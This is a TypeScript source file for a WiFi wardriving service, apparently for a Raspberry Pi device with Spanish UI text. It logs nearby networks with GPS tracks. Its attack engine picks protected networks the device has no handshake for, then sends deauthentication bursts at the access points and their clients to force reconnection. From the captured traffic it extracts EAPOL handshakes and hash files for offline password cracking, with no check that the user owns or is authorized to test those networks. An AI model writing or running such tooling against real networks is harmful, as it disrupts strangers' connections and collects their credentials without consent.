import { execFile } from "child_process";
import { promisify } from "util";
import { EventEmitter } from "events";
import fs from "fs";
import path from "path";
import { detectMonitorAdapter } from "../wifiradar/adapter";
import { enterMonitorMode, exitMonitorMode, setChannel, getAvailable24GhzChannels } from "../wifiradar/monitor-control";
import { getGpsStatus } from "../utils/gps";
import { registerShutdownHook } from "../device/display";
import { lookupVendorOrRandom } from "../wifiradar/oui";
import { stopWifiRadarService, startWifiRadarService } from "../wifiradar/service";
import { getPlatformMode } from "../utils/platform-mode";
import { DriveCapture, newestRingFile, type DriveFrame } from "./capture";
import { extractEapolToSession, DeauthOpRunner } from "./attack";
import { driveDb, DRIVE_SESSIONS_ROOT } from "./drive-db";
import type { DriveStatus, DriveApView, ApSessionState } from "./types";

const execFileAsync = promisify(execFile);

// ─── Policy constants (docs/wardrive.md) ───────────────────────────────
const HOP_INTERVAL_MS = 400; // same cadence wifiradar proves works on this phy
const MAX_ATTEMPTS = 3; // per AP per session; then it's "exhausted"
const ATTACK_COOLDOWN_MS = 45_000; // between rounds on the SAME AP
const RSSI_GATE_DBM = -72; // "good enough to try" while moving
const DEAUTH_SPEED_MAX_KMH = 25; // opportunistic deauth only slow/stopped
const MIN_EAPOL_PAIRS = 2; // real 4-way material (hcxpcapngtool reports pairs)
const SESSION_TICK_MS = 1_000; // status/GPS/DB cadence
const POINT_MIN_MOVE_M = 6; // GPS track resolution (driving ~8m at 30km/h)
const POINT_MAX_DT_MS = 20_000; // also drop a point when parked this long
const TARGET_SCAN_INTERVAL_MS = 10_000; // pick a new attack target this often
const TARGET_DWELL_MS = 6_000; // stay on the attack channel this long
const DEAUTH_ROUND_WINDOW_MS = 8_000; // fire bursts spaced inside the window
const BURST_GAP_MS = 1_200; // between bursts inside a window

function sanitizeMac(raw: string): string {
  const mac = String(raw || "").trim().toUpperCase();
  return /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(mac) ? mac : "";
}

function haversineM(lat1: number, lon1: number, lat2: number, lon2: number): number {
  const R = 6_371_000;
  const dLat = ((lat2 - lat1) * Math.PI) / 180;
  const dLon = ((lon2 - lon1) * Math.PI) / 180;
  const s =
    Math.sin(dLat / 2) ** 2 +
    Math.cos((lat1 * Math.PI) / 180) * Math.cos((lat2 * Math.PI) / 180) * Math.sin(dLon / 2) ** 2;
  return 2 * R * Math.asin(Math.sqrt(s));
}

type AirAp = {
  bssid: string;
  ssid: string;
  channel: number;
  rssi: number;
  bestRssi: number;
  security: string;
  packets: number;
  firstSeen: number;
  lastSeen: number;
};

export class DriveWardriveService extends EventEmitter {
  private running = false;
  private iface: string | null = null;
  private phy: string | null = null;
  private channels: number[] = [];
  private hopIndex = 0;
  private hopTimer: ReturnType<typeof setInterval> | null = null;
  private tickTimer: ReturnType<typeof setInterval> | null = null;
  private scanTimer: ReturnType<typeof setInterval> | null = null;
  private error = "";
  private opportunisticDeauth = false;

  // In-memory air picture (rebuilt every session; the DB is the archive)
  private air = new Map<string, AirAp>();
  private apState = new Map<string, ApSessionState>();
  // ssid -> handshake knowledge from the DB at session start
  private knownHandshakeSsids = new Set<string>();
  // SSIDs this session already recorded as new (dedup of "new" counting)
  private sessionNewSsids = new Set<string>();
  private sessionNewHandshakeSsids = new Set<string>();

  // Session + GPS
  private sessionId: string | null = null;
  private sessionDir: string | null = null;
  private ringDir: string | null = null;
  private startedAt = 0;
  private lastPointAt = 0;
  private lastPointLat: number | null = null;
  private lastPointLon: number | null = null;
  private distanceM = 0;
  private points = 0;
  private gpsHasFix = false;
  private gpsLat: number | null = null;
  private gpsLon: number | null = null;
  private gpsSpeed: number | null = null;
  private gpsHeading: number | null = null;
  private gpsHdop: number | null = null;
  private gpsSatsUsed = 0;
  private gpsSatsInView = 0;
  private gpsError = "GPS sin datos";
  private currentChannel = 0;

  // Attack engine
  private capture: DriveCapture | null = null;
  private attackBssid: string | null = null;
  private attackChannel = 0;
  private attackUntil = 0;
  private deauthRunner: DeauthOpRunner | null = null;
  private deauthTimers: ReturnType<typeof setTimeout>[] = [];
  // hcx conversions in flight (bssid -> promise) so a burst never double-
  // fires an extraction while the previous one is still reading the ring.
  private extracting = new Set<string>();

  // Demo source (platform mode): synthetic APs/GPS, no hardware touched.
  private demo = false;
  private demoT = 0;

  // ─── Start / stop ──────────────────────────────────────────────────────

  async start(): Promise<{ ok: boolean; error?: string }> {
    if (this.running) return { ok: true };
    this.error = "";
    if (getPlatformMode() === "demo") {
      this.demo = true;
      this.iface = null;
      this.running = true;
      this.beginSession(true);
      this.broadcastStatus();
      console.log("[wardrive] started (demo)");
      return { ok: true };
    }
    try {
      const info = await detectMonitorAdapter();
      if (!info.present) {
        this.error = "No hay adaptador WiFi USB conectado — enchufá el dongle para wardrive";
        return { ok: false, error: this.error };
      }
      if (!info.monitorSupported || !info.iface) {
        this.error = `El adaptador ${info.description || "USB"} no soporta modo monitor`;
        return { ok: false, error: this.error };
      }
      await stopWifiRadarService().catch(() => {});
      this.iface = info.iface;
      this.phy = info.phy || null;
      await enterMonitorMode(this.iface);
      this.channels = await getAvailable24GhzChannels(this.phy!);
      if (this.channels.length === 0) this.channels = [1, 6, 11];
      this.running = true;
      this.beginSession(false);
      this.startHopper();
      this.startTimers();
      this.broadcastStatus();
      console.log(`[wardrive] started (iface=${this.iface}, ${this.channels.length} channels)`);
      return { ok: true };
    } catch (err: any) {
      this.error = err?.message || String(err);
      await this.stopInternal(false);
      return { ok: false, error: this.error };
    }
  }

  async stop(): Promise<{ ok: boolean }> {
    await this.stopInternal(true);
    return { ok: true };
  }

  private async stopInternal(restore: boolean): Promise<void> {
    const wasRunning = this.running;
    this.running = false;
    this.stopTimers();
    this.stopDeauth();
    this.capture?.stop();
    this.capture = null;
    this.finalizeSession();
    this.air.clear();
    this.apState.clear();
    this.attackBssid = null;
    if (restore && this.iface) {
      const iface = this.iface;
      this.iface = null;
      await exitMonitorMode(iface).catch((err) =>
        console.warn(`[wardrive] failed to restore ${iface}:`, err?.message || err),
      );
      startWifiRadarService();
    }
    this.demo = false;
    this.broadcastStatus();
    if (wasRunning) console.log("[wardrive] stopped");
  }

  setOpportunisticDeauth(on: boolean): void {
    this.opportunisticDeauth = Boolean(on);
    if (!on) this.stopDeauth();
    this.broadcastStatus();
  }

  getOpportunisticDeauth(): boolean {
    return this.opportunisticDeauth;
  }

  setDemoMode(demo: boolean): void {
    if (this.demo === demo) return;
    if (this.running) void this.stop();
    this.demo = demo;
  }

  private beginSession(demo: boolean): void {
    this.startedAt = Date.now();
    const id = "drive-" + new Date(this.startedAt).toISOString().replace(/[-:]/g, "").replace(/\..+$/, "").replace("T", "-");
    this.sessionId = id;
    this.sessionDir = path.join(DRIVE_SESSIONS_ROOT, id);
    this.ringDir = path.join(this.sessionDir, "ring");
    try {
      fs.mkdirSync(this.ringDir, { recursive: true });
      if (!demo) {
        fs.writeFileSync(path.join(this.sessionDir, "session.json"), JSON.stringify({ id, startedAt: this.startedAt, kind: "drive" }, null, 2));
      } else {
        this.sessionDir = null;
        this.ringDir = null;
      }
    } catch (err: any) {
      console.warn("[wardrive] session dir failed:", err?.message || err);
      this.sessionDir = null;
      this.ringDir = null;
    }
    driveDb.insertSession(id, this.startedAt);
    this.lastPointAt = 0;
    this.lastPointLat = null;
    this.lastPointLon = null;
    this.distanceM = 0;
    this.points = 0;
    this.sessionNewSsids.clear();
    this.sessionNewHandshakeSsids.clear();
    this.knownHandshakeSsids = driveDb.handshakeSsids();
    if (demo) {
      this.startDemoFeed();
      return;
    }
    // Capture pipeline with ringbuffer artifacts (real sessions only).
    this.capture = new DriveCapture();
    this.capture.on("frame", (frame: DriveFrame) => this.onFrame(frame));
    this.capture.on("exit", () => {
      if (this.running) this.error = "Captura interrumpida — revisá el dongle";
    });
    this.capture.start(this.iface!, this.ringDir);
  }

  private finalizeSession(): void {
    if (!this.sessionId) return;
    const networks = this.sessionNewSsids.size;
    driveDb.updateSession(this.sessionId, {
      endedAt: Date.now(),
      distanceM: Math.round(this.distanceM),
      points: this.points,
      networks,
      handshakes: this.sessionNewHandshakeSsids.size,
    });
    this.sessionId = null;
  }

  // ─── Channel hopping ───────────────────────────────────────────────────

  private startHopper(): void {
    if (this.hopTimer) return;
    this.hopTimer = setInterval(() => {
      if (!this.iface || this.channels.length === 0) return;
      if (this.attackBssid && Date.now() < this.attackUntil) return; // dwell
      const ch = this.channels[this.hopIndex % this.channels.length];
      this.hopIndex += 1;
      this.currentChannel = ch;
      setChannel(this.iface, ch).catch((err) =>
        console.warn(`[wardrive] setChannel(${ch}) failed:`, err?.message || err),
      );
    }, HOP_INTERVAL_MS);
  }

  // ─── Frame ingestion ───────────────────────────────────────────────────

  private onFrame(frame: DriveFrame): void {
    if (!this.running) return;
    if (frame.kind === "beacon") {
      const existing = this.air.get(frame.bssid);
      if (existing) {
        existing.lastSeen = frame.ts;
        existing.packets += 1;
        existing.rssi = frame.rssi;
        if (frame.rssi > existing.bestRssi) existing.bestRssi = frame.rssi;
        if (frame.ssid && frame.ssid !== "(oculta)" && existing.ssid === "(oculta)") existing.ssid = frame.ssid;
        if (frame.security !== "UNKNOWN" && existing.security === "UNKNOWN") existing.security = frame.security;
      } else {
        this.air.set(frame.bssid, {
          bssid: frame.bssid,
          ssid: frame.ssid,
          channel: frame.channel,
          rssi: frame.rssi,
          bestRssi: frame.rssi,
          security: frame.security,
          packets: 1,
          firstSeen: frame.ts,
          lastSeen: frame.ts,
        });
      }
      // Persist + dedup. Hidden networks can't be matched by SSID — skipped.
      if (frame.ssid && frame.ssid !== "(oculta)") {
        const isNew = driveDb.recordNetwork(frame.ssid, frame.security);
        if (isNew) this.sessionNewSsids.add(frame.ssid);
        else this.sessionNewSsids.add(frame.ssid); // seen this session either way
      }
      this.maybeAttack(frame.bssid);
      return;
    }
    if (frame.kind === "eapol") {
      this.onEapol(frame.bssid);
      return;
    }
    // deauth frame: just confirmation noise for now (bursts are counted by
    // the runner itself).
  }

  // EAPOL seen on air → if this SSID is still "uncovered", extract artifacts
  // from the ring pcaps and mark captured. This fires regardless of whether
  // WE sent a deauth (opportunistic in both senses).
  private async onEapol(bssid: string): Promise<void> {
    const ap = this.air.get(bssid);
    if (!ap || !ap.ssid || ap.ssid === "(oculta)") return;
    if (this.knownHandshakeSsids.has(ap.ssid)) return; // already covered
    if (this.extracting.has(bssid)) return;
    if (!this.ringDir || !this.sessionDir) return;
    this.extracting.add(bssid);
    try {
      const res = await extractEapolToSession(bssid, this.ringDir, this.sessionDir);
      if (res.ok && res.eapolPairs >= MIN_EAPOL_PAIRS) {
        const st = this.stateFor(bssid);
        st.captured = true;
        st.eapolFrames += res.eapolPairs;
        st.method = "deauth"; // provenance is fuzzy at drive speed; deauth-ish
        st.capFile = res.capFile;
        st.hashFile = res.hashFile;
        this.knownHandshakeSsids.add(ap.ssid);
        this.sessionNewHandshakeSsids.add(ap.ssid);
        driveDb.markHandshake({
          ssid: ap.ssid,
          bssid,
          security: ap.security,
          method: st.lastDeauthAt > 0 ? "deauth" : "pmkid",
          capFile: res.capFile,
          hashFile: res.hashFile,
          sessionDir: this.sessionDir,
          sessionId: this.sessionId || "",
          lat: this.gpsLat,
          lon: this.gpsLon,
        });
        console.log(`[wardrive] HANDSHAKE ${ap.ssid} (${bssid}) pairs=${res.eapolPairs}`);
        this.broadcastStatus();
      }
    } finally {
      this.extracting.delete(bssid);
    }
  }

  // ─── Opportunistic deauth scheduler ────────────────────────────────────

  private stateFor(bssid: string): ApSessionState {
    let st = this.apState.get(bssid);
    if (!st) {
      st = {
        status: "fresh",
        attempts: 0,
        lastAttackAt: 0,
        lastDeauthAt: 0,
        cooldownUntil: 0,
        eapolFrames: 0,
        captured: false,
        method: "",
        capFile: "",
        hashFile: "",
        lastRssi: -100,
        bestRssi: -100,
        lastSeen: 0,
        firstSeen: Date.now(),
        clients: new Set(),
        channel: 0,
        packets: 0,
      };
      this.apState.set(bssid, st);
    }
    return st;
  }

  // Called on every beacon from an AP: if the opportunistic gate is on and
  // the AP deserves a shot, schedule an attack round.
  private maybeAttack(bssid: string): void {
    if (!this.opportunisticDeauth || !this.running) return;
    if (this.attackBssid && Date.now() < this.attackUntil) return;
    const ap = this.air.get(bssid);
    if (!ap) return;
    const st = this.stateFor(bssid);
    if (st.captured || st.status === "exhausted") return;
    if (ap.security === "OPEN") {
      st.status = "open";
      return;
    }
    if (ap.security === "UNKNOWN") return; // don't shoot blind
    const ssid = ap.ssid;
    if (!ssid || ssid === "(oculta)") return;
    if (this.knownHandshakeSsids.has(ssid)) {
      st.status = "captured"; // covered by another AP of this SSID
      return;
    }
    if (Date.now() < st.cooldownUntil) return;
    if (st.attempts >= MAX_ATTEMPTS) {
      st.status = "exhausted";
      return;
    }
    if (ap.bestRssi < RSSI_GATE_DBM) return; // too weak while moving
    // GPS speed gate: deauth only when slow/stopped. No fix = no deauth
    // (we can't know we're parked — be conservative).
    if (this.gpsSpeed != null && this.gpsSpeed > DEAUTH_SPEED_MAX_KMH) return;
    if (this.gpsSpeed == null && !this.demo) return;
    // One at a time: lock the radio to the target's channel for a window.
    if (this.attackBssid) return;
    void this.attackAp(ap, st);
  }

  private async attackAp(ap: AirAp, st: ApSessionState): Promise<void> {
    if (!this.iface || !this.running) return;
    this.attackBssid = ap.bssid;
    this.attackChannel = ap.channel || this.currentChannel || 1;
    this.attackUntil = Date.now() + TARGET_DWELL_MS + DEAUTH_ROUND_WINDOW_MS;
    st.status = "attacking";
    st.attempts += 1;
    try {
      await setChannel(this.iface, this.attackChannel);
    } catch {
      this.attackBssid = null;
      st.status = "fresh";
      return;
    }
    // Fire one burst now, another mid-window (client-directed first).
    const clients = [...st.clients].slice(0, 2);
    const fire = (client: string | null) => {
      if (!this.running || !this.iface) return;
      this.deauthRunner?.stop();
      this.deauthRunner = new DeauthOpRunner(this.iface, ap.bssid, client, 16);
      this.deauthRunner.start();
      st.lastDeauthAt = Date.now();
    };
    fire(clients.length > 0 ? clients[0] : null);
    const midTimer = setTimeout(() => {
      if (Date.now() < this.attackUntil && this.attackBssid === ap.bssid) {
        const c = [...st.clients];
        fire(c.length > 1 ? c[1] : null);
      }
    }, BURST_GAP_MS);
    this.deauthTimers.push(midTimer);
    const endTimer = setTimeout(() => {
      if (this.attackBssid !== ap.bssid) return;
      this.stopDeauth();
      this.attackBssid = null;
      if (!st.captured) {
        st.status = st.attempts >= MAX_ATTEMPTS ? "exhausted" : "attack-scheduled";
        st.cooldownUntil = Date.now() + ATTACK_COOLDOWN_MS;
      }
      this.broadcastStatus();
    }, TARGET_DWELL_MS + DEAUTH_ROUND_WINDOW_MS);
    this.deauthTimers.push(midTimer, endTimer);
  }

  private stopDeauth(): void {
    for (const t of this.deauthTimers) clearTimeout(t);
    this.deauthTimers = [];
    this.deauthRunner?.stop();
    this.deauthRunner = null;
  }

  // ─── Session tick: GPS ingest, track points, counters ────────────────────

  private startTimers(): void {
    if (this.tickTimer) return;
    this.tickTimer = setInterval(() => void this.tick(), SESSION_TICK_MS);
    this.scanTimer = setInterval(() => this.pickTarget(), TARGET_SCAN_INTERVAL_MS);
    // Demo capture simulation only when demo is actually active.
    if (this.demo) {
      this.demoCaptureTimer = setInterval(() => this.demoCapture(), 45_000);
    }
  }

  private stopTimers(): void {
    if (this.tickTimer) {
      clearInterval(this.tickTimer);
      this.tickTimer = null;
    }
    if (this.scanTimer) {
      clearInterval(this.scanTimer);
      this.scanTimer = null;
    }
    if (this.demoCaptureTimer) {
      clearInterval(this.demoCaptureTimer);
      this.demoCaptureTimer = null;
    }
  }

  private async tick(): Promise<void> {
    if (!this.running) return;
    if (this.demo) {
      this.demoTick();
      return;
    }
    try {
      const gps = await getGpsStatus();
      this.gpsHasFix = gps.hasFix;
      this.gpsLat = gps.hasFix ? gps.latitude : null;
      this.gpsLon = gps.hasFix ? gps.longitude : null;
      this.gpsSpeed = gps.speedKmh;
      this.gpsHeading = gps.headingDeg;
      this.gpsHdop = gps.hdop;
      this.gpsSatsUsed = gps.satellitesUsed;
      this.gpsSatsInView = gps.satellitesInView;
      this.gpsError = gps.hasFix ? "" : gps.error || "Sin fix GPS";
    } catch {
      this.gpsError = "GPS sin datos";
    }
    this.maybeRecordPoint();
    if (this.sessionId) {
      driveDb.updateSession(this.sessionId, {
        distanceM: Math.round(this.distanceM),
        points: this.points,
        networks: this.sessionNewSsids.size,
        handshakes: this.sessionNewHandshakeSsids.size,
      });
    }
  }

  private maybeRecordPoint(): void {
    if (!this.gpsHasFix || this.gpsLat == null || this.gpsLon == null) return;
    const now = Date.now();
    const moved = this.lastPointLat != null && this.lastPointLon != null
      ? haversineM(this.lastPointLat, this.lastPointLon, this.gpsLat, this.gpsLon)
      : Infinity;
    if (this.lastPointAt === 0) {
      this.recordPoint(now);
      return;
    }
    if (moved >= POINT_MIN_MOVE_M) {
      this.recordPoint(now);
      return;
    }
    if (now - this.lastPointAt >= POINT_MAX_DT_MS) {
      this.recordPoint(now);
    }
  }

  private recordPoint(now: number): void {
    if (this.lastPointLat != null && this.lastPointLon != null && this.gpsLat != null && this.gpsLon != null) {
      this.distanceM += haversineM(this.lastPointLat, this.lastPointLon, this.gpsLat, this.gpsLon);
    }
    this.lastPointAt = now;
    this.lastPointLat = this.gpsLat!;
    this.lastPointLon = this.gpsLon!;
    this.points += 1;
    if (this.sessionId) {
      driveDb.addTrackPoint(this.sessionId, now, this.gpsLat!, this.gpsLon!, this.gpsSpeed, this.gpsHeading, this.gpsHdop);
    }
  }

  // Demo feed (platform mode) ─────────────────────────────────────────────

  private demoCaptureTimer: ReturnType<typeof setInterval> | null = null;

  private startDemoFeed(): void {
    if (!this.tickTimer) {
      this.tickTimer = setInterval(() => this.demoTick(), SESSION_TICK_MS);
      this.scanTimer = setInterval(() => this.pickTarget(), TARGET_SCAN_INTERVAL_MS);
      this.demoCaptureTimer = setInterval(() => this.demoCapture(), 45_000);
    }
    this.demoT = 0;
  }

  private demoTick(): void {
    this.demoT += 1;
    const t = this.demoT;
    // Drive a slow loop around the Zócalo (demo fix, same as gps.ts).
    const baseLat = 19.4326 + Math.sin(t / 120) * 0.0012;
    const baseLon = -99.1332 + Math.cos(t / 90) * 0.0015;
    this.gpsHasFix = true;
    this.gpsLat = baseLat;
    this.gpsLon = baseLon;
    this.gpsSpeed = 18 + Math.round(Math.sin(t / 30) * 8);
    this.gpsHeading = (t * 3) % 360;
    this.gpsHdop = 1.2;
    this.gpsSatsUsed = 7;
    this.gpsSatsInView = 9;
    this.gpsError = "";
    this.currentChannel = [1, 6, 11][Math.floor(t / 5) % 3];
    // Synthetic APs pop in as we "drive".
    const n = 6;
    for (let i = 0; i < n; i++) {
      const seed = `${i}`;
      const bssid = `DE:MO:0${(i % 10)}:0${(i % 10)}:0${(i % 10)}:0${(i % 10)}`;
      const ssid = ["Red_Cafe", "CasaVecina", "Net_2G", "TiendaMovil", "Guest_Fast", "MiRed_5G"][i % n];
      const security = ["WPA2/3", "WPA2/3", "WPA2/3", "OPEN", "WPA", "WPA2/3"][i % n];
      const rssi = -45 - ((t + i * 17) % 40);
      const existing = this.air.get(bssid);
      if (existing) {
        existing.rssi = rssi;
        existing.bestRssi = Math.max(existing.bestRssi, rssi);
        existing.lastSeen = Date.now();
        existing.packets += 1;
      } else {
        this.air.set(bssid, {
          bssid,
          ssid: `${ssid}_${seed}`,
          channel: [1, 3, 6, 9, 11, 13][i % 6],
          rssi,
          bestRssi: rssi,
          security,
          packets: 1,
          firstSeen: Date.now(),
          lastSeen: Date.now(),
        });
        driveDb.recordNetwork(`${ssid}_${seed}`, security);
        this.sessionNewSsids.add(`${ssid}_${seed}`);
      }
    }
    this.maybeRecordPoint();
  }

  // Demo deauth/capture cycle: mark one eligible AP "captured" every ~45s.
  private demoCapture(): void {
    for (const [, ap] of this.air) {
      if (ap.security === "OPEN") continue;
      if (this.knownHandshakeSsids.has(ap.ssid)) continue;
      const st = this.stateFor(ap.bssid);
      if (st.captured || st.attempts === 0) continue;
      st.captured = true;
      st.status = "captured";
      st.method = "deauth";
      this.knownHandshakeSsids.add(ap.ssid);
      this.sessionNewHandshakeSsids.add(ap.ssid);
      driveDb.markHandshake({
        ssid: ap.ssid,
        bssid: ap.bssid,
        security: ap.security,
        method: "deauth",
        capFile: "",
        hashFile: "",
        sessionDir: "",
        sessionId: this.sessionId || "",
        lat: this.gpsLat,
        lon: this.gpsLon,
      });
      this.broadcastStatus();
      return;
    }
  }

  private pickTarget(): void {
    if (!this.running || !this.opportunisticDeauth) return;
    if (this.demo) {
      this.demoCapture();
      return;
    }
    // Prefer strong, uncovered, recently-seen APs; weak/distant ones wait.
    const candidates: { ap: AirAp; st: ApSessionState }[] = [];
    for (const [, ap] of this.air) {
      if (ap.security === "OPEN" || ap.security === "UNKNOWN") continue;
      if (!ap.ssid || ap.ssid === "(oculta)") continue;
      if (this.knownHandshakeSsids.has(ap.ssid)) continue;
      const st = this.stateFor(ap.bssid);
      if (st.captured || st.status === "exhausted" || st.attempts >= MAX_ATTEMPTS) continue;
      if (Date.now() < st.cooldownUntil) continue;
      if (ap.bestRssi < RSSI_GATE_DBM) continue;
      candidates.push({ ap, st });
    }
    candidates.sort((a, b) => b.ap.bestRssi - a.ap.bestRssi);
    if (candidates.length > 0 && !this.attackBssid) {
      void this.attackAp(candidates[0].ap, candidates[0].st);
    }
  }

  // ─── Status for the web UI ──────────────────────────────────────────────

  getStatus(): DriveStatus {
    const dbStats = driveDb.stats();
    const recent: DriveApView[] = [...this.air.values()]
      .sort((a, b) => b.rssi - a.rssi)
      .slice(0, 40)
      .map((ap) => {
        const st = this.apState.get(ap.bssid);
        return this.apView(ap, st);
      });
    return {
      running: this.running,
      session:
        this.running && this.sessionId
          ? {
              id: this.sessionId,
              startedAt: this.startedAt,
              durationSec: Math.round((Date.now() - this.startedAt) / 1000),
              distanceMeters: Math.round(this.distanceM),
              points: this.points,
            }
          : null,
      gps: {
        hasFix: this.gpsHasFix,
        latitude: this.gpsLat,
        longitude: this.gpsLon,
        speedKmh: this.gpsSpeed,
        headingDeg: this.gpsHeading,
        hdop: this.gpsHdop,
        satellitesUsed: this.gpsSatsUsed,
        satellitesInView: this.gpsSatsInView,
        error: this.gpsError,
      },
      opportunisticDeauth: this.opportunisticDeauth,
      iface: this.iface,
      error: this.error,
      channel: this.currentChannel,
      stats: {
        aps: this.air.size,
        unique: dbStats.unique,
        newThisSession: this.sessionNewSsids.size,
        handshakes: dbStats.handshakes,
        newHandshakes: this.sessionNewHandshakeSsids.size,
        points: this.points,
      },
      recent,
    };
  }

  private apView(ap: AirAp, st: ApSessionState | undefined): DriveApView {
    const known = this.knownHandshakeSsids.has(ap.ssid);
    return {
      bssid: ap.bssid,
      ssid: ap.ssid,
      channel: ap.channel,
      rssi: ap.rssi,
      security: ap.security as DriveApView["security"],
      vendor: lookupVendorOrRandom(ap.bssid).vendor,
      firstSeenTs: ap.firstSeen,
      lastSeenTs: ap.lastSeen,
      packets: ap.packets,
      bestRssi: ap.bestRssi,
      handshakeKnown: known,
      handshakeHere: st?.captured === true,
      attempts: st?.attempts ?? 0,
      eapolFrames: st?.eapolFrames ?? 0,
      status: st?.captured
        ? "captured"
        : ap.security === "OPEN"
          ? "open"
          : (st?.status as DriveApView["status"]) || "fresh",
    };
  }

  // ─── Exports ───────────────────────────────────────────────────────────

  sessionCsv(sessionId: string): string | null {
    if (!sessionId.startsWith("drive-") || sessionId.includes("/") || sessionId.includes("\\")) return null;
    const pts = driveDb.trackPoints(sessionId);
    if (pts.length === 0) return null;
    // WiGLE-compatible CSV: MAC, SSID, AuthMode, FirstSeen, Channel, RSSI,
    // CurrentLatitude, CurrentLongitude, Altitude, Accuracy, Type.
    const nets = driveDb.sessionNetworks(sessionId);
    const byFirst = new Map<string, { lat: number; lon: number; ts: number }>();
    for (const p of pts) byFirst.set("anchor", p); // placeholder to satisfy lint
    void byFirst;
    const lines = ["MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,Altitude,Accuracy,Type"];
    for (const n of nets) {
      const anchor = pts[Math.min(1, pts.length - 1)];
      const pos = n.lat != null && n.lon != null ? { lat: n.lat, lon: n.lon } : { lat: anchor.lat, lon: anchor.lon };
      lines.push(
        [
          n.bssid || "00:00:00:00:00:00",
          `"${n.ssid.replace(/"/g, '""')}"`,
          n.security.replace("/", ""),
          new Date(n.first_seen).toISOString(),
          "",
          "",
          pos.lat.toFixed(6),
          pos.lon.toFixed(6),
          "",
          "",
          "WIFI",
        ].join(","),
      );
    }
    return lines.join("\n");
  }

  sessionGpx(sessionId: string): string | null {
    if (!sessionId.startsWith("drive-") || sessionId.includes("/") || sessionId.includes("\\")) return null;
    const pts = driveDb.trackPoints(sessionId);
    if (pts.length === 0) return null;
    const lines: string[] = [
      `<?xml version="1.0" encoding="UTF-8"?>`,
      `<gpx version="1.1" creator="akbal-pi wardrive" xmlns="http://www.topografix.com/GPX/1/1">`,
      `  <trk><name>${sessionId}</name><trkseg>`,
    ];
    for (const p of pts) {
      lines.push(`    <trkpt lat="${p.lat.toFixed(6)}" lon="${p.lon.toFixed(6)}"><time>${new Date(p.ts).toISOString()}</time></trkpt>`);
    }
    lines.push(`  </trkseg></trk>`, `</gpx>`);
    return lines.join("\n");
  }

  // ─── Shutdown ──────────────────────────────────────────────────────────

  registerShutdown(): void {
    registerShutdownHook(async () => {
      if (!this.running) return;
      await this.stopInternal(false);
    });
  }

  private broadcastStatus(): void {
    this.emit("status", this.getStatus());
  }
}

// Single shared instance — the wardrive owns the only monitor radio while a
// session runs; everything else is read-only over it.
const sharedDriveWardriveService = new DriveWardriveService();

export function getDriveWardriveService(): DriveWardriveService {
  return sharedDriveWardriveService;
}

// Demo-mode re-export for the platform toggle (utils/platform-mode.ts):
export function driveWardriveSetDemo(demo: boolean): void {
  sharedDriveWardriveService.setDemoMode(demo);
}